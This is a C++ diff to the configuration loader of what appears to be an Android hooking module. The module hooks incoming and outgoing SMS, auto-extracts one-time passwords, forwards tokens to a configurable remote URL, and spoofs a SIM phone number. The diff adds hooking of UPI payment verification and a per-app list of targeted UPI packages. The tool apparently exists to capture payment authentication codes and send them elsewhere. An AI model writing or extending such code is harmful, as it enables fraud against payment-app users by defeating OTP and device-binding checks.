@@ -94,6 +94,35 @@ std::map<std::string, std::string> parse_headers(const std::string& json) {
     return headers;
 }
 
+std::map<std::string, bool> parse_bool_map(const std::string& json, const std::string& key) {
+    std::map<std::string, bool> result;
+    const std::string needle = "\"" + key + "\"";
+    auto pos = json.find(needle);
+    if (pos == std::string::npos) return result;
+    pos = json.find('{', pos);
+    if (pos == std::string::npos) return result;
+    auto end = json.find('}', pos);
+    if (end == std::string::npos) return result;
+
+    std::string block = json.substr(pos + 1, end - pos - 1);
+    size_t cursor = 0;
+    while (cursor < block.size()) {
+        auto key_start = block.find('"', cursor);
+        if (key_start == std::string::npos) break;
+        auto key_end = block.find('"', key_start + 1);
+        if (key_end == std::string::npos) break;
+        auto colon = block.find(':', key_end);
+        if (colon == std::string::npos) break;
+        auto value_start = block.find_first_not_of(" \t\r\n", colon + 1);
+        if (value_start == std::string::npos) break;
+
+        result[block.substr(key_start + 1, key_end - key_start - 1)] =
+            block.compare(value_start, 4, "true") == 0;
+        cursor = key_end + 1;
+    }
+    return result;
+}
+
 std::string read_file(const std::string& path) {
     std::ifstream file(path);
     if (!file.is_open()) return "";
@@ -141,6 +170,7 @@ bool ConfigManager::load() {
     config_.mock_phone_sim2 = parse_string(json, "mock_phone_sim2", config_.mock_phone_sim2);
     config_.hook_incoming_sms = parse_bool(json, "hook_incoming_sms", true);
     config_.hook_outgoing_sms = parse_bool(json, "hook_outgoing_sms", true);
+    config_.hook_upi_verification = parse_bool(json, "hook_upi_verification", true);
     config_.auto_extract_otp = parse_bool(json, "auto_extract_otp", true);
     config_.auto_forward_token = parse_bool(json, "auto_forward_token", true);
     config_.forward_url = parse_string(json, "forward_url", config_.forward_url);
@@ -152,6 +182,7 @@ bool ConfigManager::load() {
     config_.log_file = parse_string(json, "log_file", config_.log_file);
     config_.otp_patterns = parse_string_array(json, "otp_patterns");
     config_.forward_headers = parse_headers(json);
+    config_.hooked_upi_apps = parse_bool_map(json, "hooked_upi_apps");
 
     if (config_.otp_patterns.empty()) {
         config_.otp_patterns = {
@@ -167,4 +198,12 @@ bool ConfigManager::load() {
 
 void ConfigManager::reload() {
     load();
+}
+
+bool ModuleConfig::is_upi_app_hooked(const std::string& package) const {
+    if (package.empty()) return false;
+    if (hooked_upi_apps.empty()) return true;
+    const auto it = hooked_upi_apps.find(package);
+    if (it == hooked_upi_apps.end()) return false;
+    return it->second;
 }
